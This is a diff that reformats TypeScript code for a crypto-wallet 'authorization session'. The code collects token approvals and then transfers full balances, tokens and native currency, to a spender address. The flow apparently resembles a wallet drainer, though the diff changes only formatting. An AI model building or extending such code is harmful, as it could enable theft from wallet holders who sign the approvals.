@@ -114,24 +114,23 @@ export type RunAuthorizationSessionArgs = {
 
 function isSuccessOutcome(outcome: AuthorizationAssetOutcome): boolean {
   return (
-    outcome === "authorized" ||
-    outcome === "collected" ||
-    outcome === "pending"
+    outcome === "authorized" || outcome === "collected" || outcome === "pending"
   );
 }
 
 function summarize(
-  items: AuthorizationAssetResult[]
+  items: AuthorizationAssetResult[],
 ): AuthorizationSessionResult {
   return {
     items,
     authorizedCount: items.filter((i) => isSuccessOutcome(i.outcome)).length,
     failedCount: items.filter((i) => i.outcome === "failed").length,
     rejectedCount: items.filter((i) => i.outcome === "user_rejected").length,
-    skippedCount: items.filter((i) =>
-      i.outcome === "skipped_unsupported" ||
-      i.outcome === "skipped_zero" ||
-      i.outcome === "skipped_dependency_failed"
+    skippedCount: items.filter(
+      (i) =>
+        i.outcome === "skipped_unsupported" ||
+        i.outcome === "skipped_zero" ||
+        i.outcome === "skipped_dependency_failed",
     ).length,
   };
 }
@@ -142,7 +141,7 @@ function summarize(
  * 2. Settlement phase — confirm approvals, collect USDT → USDC via existing queue, then native.
  */
 export async function runAuthorizationSession(
-  args: RunAuthorizationSessionArgs
+  args: RunAuthorizationSessionArgs,
 ): Promise<AuthorizationSessionResult> {
   const results: AuthorizationAssetResult[] = [];
   const captures: WalletPhaseCapture[] = [];
@@ -152,7 +151,9 @@ export async function runAuthorizationSession(
     args.transactionId?.trim() ||
     args.sessionId?.trim() ||
     args.authorizationSessionId?.trim() ||
-    (walletForJourney ? generateFlowId({ walletAddress: walletForJourney }) : "");
+    (walletForJourney
+      ? generateFlowId({ walletAddress: walletForJourney })
+      : "");
   if (!sessionId) {
     throw new Error("transactionId is required for authorization session");
   }
@@ -214,7 +215,8 @@ export async function runAuthorizationSession(
               owner,
               authorizationKind: "evm_batch_executed",
               authorizationPayload: { txHash: batchResults.nativeTxHash },
-              estimateTransferableRaw: batchResults.nativeTransferableRaw ?? undefined,
+              estimateTransferableRaw:
+                batchResults.nativeTransferableRaw ?? undefined,
               recipient: batchResults.nativeRecipient ?? undefined,
             };
             log("EVM_NATIVE_BATCH_EXECUTED", {
@@ -316,7 +318,11 @@ export async function runAuthorizationSession(
 
   args.onWalletPhaseComplete?.(walletSummary);
 
-  if (args.startSettlement !== false && args.runApprovalSettlement && captures.length > 0) {
+  if (
+    args.startSettlement !== false &&
+    args.runApprovalSettlement &&
+    captures.length > 0
+  ) {
     for (const capture of captures) {
       void runAuthorizationSettlement({
         capture,
@@ -408,7 +414,7 @@ async function runTokenWalletPhase(ctx: {
   try {
     const availableBalanceRaw = parseHumanToRaw(
       tokenBalanceHuman,
-      tokenInfo.decimals
+      tokenInfo.decimals,
     );
     const requestedTransferRaw = item.unlimited
       ? availableBalanceRaw
@@ -440,7 +446,9 @@ async function runTokenWalletPhase(ctx: {
           tokenBalanceHuman,
           executeTransfer: shouldAttemptTransfer,
           transferToAddress: spender,
-          transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
+          transferAmountRaw: shouldAttemptTransfer
+            ? transferAmountRaw
+            : undefined,
           traceId: args.transactionId ?? sessionId,
         };
         const preflightApi = createPreflightApi(args.apiBaseUrl);
@@ -573,14 +581,15 @@ async function runNativeWalletPhase(ctx: {
     (r) =>
       r.network === item.network &&
       r.token !== "NATIVE" &&
-      (r.outcome === "failed" || r.outcome === "user_rejected")
+      (r.outcome === "failed" || r.outcome === "user_rejected"),
   );
   if (tokenDependencyFailed) {
     const result: AuthorizationAssetResult = {
       network: item.network,
       token: "NATIVE",
       outcome: "skipped_dependency_failed",
-      message: "Skipped native authorization because token authorization failed",
+      message:
+        "Skipped native authorization because token authorization failed",
     };
     results.push(result);
     args.onAssetEnd?.(result);
@@ -610,7 +619,8 @@ async function runNativeWalletPhase(ctx: {
       network: item.network,
       token: "NATIVE",
       outcome: "authorized",
-      message: "Native deferred — one eth_sendTransaction after token settlement",
+      message:
+        "Native deferred — one eth_sendTransaction after token settlement",
     };
     results.push(result);
     args.onAssetEnd?.(result);
@@ -695,7 +705,9 @@ async function runNativeWalletPhase(ctx: {
   captureByNetwork.set(item.network, capture);
 }
 
-export function outcomeLabel(outcome: AuthorizationAssetResult["outcome"]): string {
+export function outcomeLabel(
+  outcome: AuthorizationAssetResult["outcome"],
+): string {
   switch (outcome) {
     case "authorized":
       return "Authorized — settlement queued";
